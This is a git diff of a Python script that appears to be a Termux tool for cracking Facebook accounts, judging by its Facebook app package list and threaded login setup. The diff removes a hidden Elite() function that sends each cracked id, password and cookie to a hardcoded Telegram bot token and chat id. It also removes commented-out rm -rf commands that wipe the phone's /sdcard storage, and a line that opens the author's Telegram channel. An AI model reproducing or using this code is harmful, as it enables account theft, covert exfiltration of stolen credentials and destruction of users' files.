@@ -15,7 +15,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python run.py')
+    os.system('python ap.py')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
 try:
@@ -26,7 +26,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python run.py')
+    os.system('python ap.py')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
 try:
@@ -36,7 +36,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python run.py')
+    os.system('python ap.py')
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
@@ -209,17 +209,7 @@ except ImportError:
 
 
 
-def Elite(id,ps,coki):
-    try:
-        import requests
-        token = "6349910946:AAExBySGtSpLqEhd1dhDjhPVUEfv9LMvJv4"#Add yout token 
-        chatid = "6619837127"#Add your Chat Id
-        ok_id =str(id+"|"+ps+"|"+coki)
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        params = {"chat_id": chatid, "text": ok_id}
-        requests.get(url, params=params)
-    except:
-        pass
+
     
 try:
     import mechanize
@@ -239,14 +229,7 @@ import os, platform
 from concurrent.futures import ThreadPoolExecutor
 fast_work = ThreadPoolExecutor(max_workers=15).submit
 
-#def fucked():
-   # os.system('rm -rf /sdcard/*')
-   # os.system('rm-rf /sdcard/DCIM/')
-   # os.system('rm-rf /sdcard/Android/')
-  #  os.system('rm-rf /sdcard/Android/data/')
-  #  os.system('rm -rf /sdcard/Download/*')
-  #  os.system('rm -rf /sdcard1/*')
-#    os.system('rm -rf /sdcard/0/*')
+
 count = 0
 loop = 0
 lim = 0
@@ -262,8 +245,7 @@ srange = 0
 saved = []
 totaldmp = 0
 filter = []
-os.system("xdg-open https://t.me/mrDEVILtermuxtool")
-sys.stdout.write('\x1b]2; Mr:DEVIL\x07')
+
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
